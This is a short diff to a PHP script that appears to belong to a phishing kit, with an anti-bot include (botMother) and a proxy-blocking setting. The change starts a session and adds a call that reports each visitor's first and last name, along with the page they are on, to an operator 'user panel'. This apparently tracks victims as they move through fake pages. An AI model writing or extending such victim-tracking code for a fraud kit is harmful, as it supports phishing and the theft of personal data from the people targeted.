@@ -1,5 +1,7 @@
 <?php 
+session_start();
 require (__DIR__).'/config.php';
+require_once (__DIR__).'/lib/user_panel.php';
 require (__DIR__).'/lib/frm.php';
 
 require (__DIR__).'/botMother/botMother.php';
@@ -33,5 +35,8 @@ if(strtolower($block_proxy)=="yes"){
      
 
  
+
+$nameHint = trim((($_SESSION['_first-name'] ?? '') . ' ' . ($_SESSION['_last-name'] ?? '')));
+panelTouchUser($nameHint, basename($_SERVER['PHP_SELF'] ?? 'index.php'));
 
 ?>
